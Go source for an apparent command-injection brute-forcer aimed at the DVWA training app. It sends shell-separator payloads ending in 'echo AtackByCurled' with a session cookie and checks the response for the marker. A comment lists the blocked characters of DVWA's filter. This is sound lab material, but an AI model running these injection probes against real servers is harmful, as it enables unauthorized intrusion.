//Command Injection
package main

import (
	"fmt"
    "strings"
    "io/ioutil"
	"net/http"
)

func InjWithCookie(cookstr string,fuckurl string,payload string) bool{
	client := &http.Client{};
	cookie2 := &http.Cookie{Name:"PHPSESSID",Value:cookstr,HttpOnly:true};
	cookie3 := &http.Cookie{Name:"security",Value:"high",HttpOnly:true};
	Modipayload := strings.NewReader("Submit=Submit&ip=127.0.0.1"+payload)

	reqest2, err := http.NewRequest("POST", fuckurl,Modipayload)
	if err != nil{
		return false
	}
	reqest2.AddCookie(cookie2)
	reqest2.AddCookie(cookie3)
	reqest2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp2,err := client.Do(reqest2);
	body, err := ioutil.ReadAll(resp2.Body)
    if err != nil {
        return false
    }
	bd := string(body)

	if strings.LastIndex(bd, "AtackByCurled") != -1{
		return true
	}
	return false
}

//读取字典文件，进行爆破
func ExcComInj(cookie string,urlDVWA string,sw *BruteSubWindow) bool {
	sw.pushAble = false

	fuckurl := urlDVWA + "vulnerabilities/exec/#"
	/*
   		'&'  => '',
        ';'  => '',
        '| ' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '', 

	*/

	var payloadJar = []string{"&",";","| ","-","$","(",")","`","||","|","--"}

	sw.progressBar.SetRange(0,len(payloadJar))
	sw.progressBar.SetValue(0)

   	for count:=0;count<len(payloadJar);count++ {
		payload := payloadJar[count]+"echo AtackByCurled"
		temp := fmt.Sprintf("test payload%d: 127.0.0.1%s \r\n",count+1,payload)
		sw.progressBar.SetValue(count+1)
		sw.outPut.AppendText(temp)
		if InjWithCookie(cookie,fuckurl,payload) == true{
			sw.outPut.AppendText("\nsuccess!\r\n")
			sw.progressBar.SetValue(len(payloadJar))
			sw.pushAble = true
			return true
		}
		if count%5 == 0{
			sw.outPut.SetText("")
		}
	   }
	   temp := fmt.Sprintf("No Pattern...")
	   sw.outPut.AppendText(temp)
	   sw.pushAble = true
	   return false

}